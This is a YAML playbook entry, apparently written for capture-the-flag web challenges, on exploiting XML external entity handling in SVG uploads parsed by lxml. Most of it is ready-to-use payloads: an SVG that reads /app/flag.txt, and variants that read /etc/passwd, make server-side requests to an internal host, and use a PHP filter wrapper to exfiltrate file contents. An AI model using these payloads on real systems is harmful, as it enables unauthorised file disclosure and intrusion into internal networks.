name: xxe_svg_upload
category: web
tags: [xxe, svg, file_upload, lxml]
indicators:
  - "SVG file upload functionality"
  - "etree.XMLParser(load_dtd=True, resolve_entities=True)"
  - "XML parsing of user-uploaded files"
  - "lxml library used for parsing"

tricks:
  - name: "XXE via SVG file upload"
    when: "SVG upload parsed with XML parser allowing DTD/entities"
    how: "Upload SVG with XXE payload to read files"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///app/flag.txt">
      ]>
      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <text x="10" y="50">&xxe;</text>
      </svg>

  - name: "Alternative XXE payloads"
    when: "Different file locations or protocols"
    how: "Modify SYSTEM entity path"
    payload: |
      # Read /etc/passwd:
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
      
      # SSRF via HTTP:
      <!ENTITY xxe SYSTEM "http://internal-server/api">
      
      # PHP wrapper (if PHP):
      <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
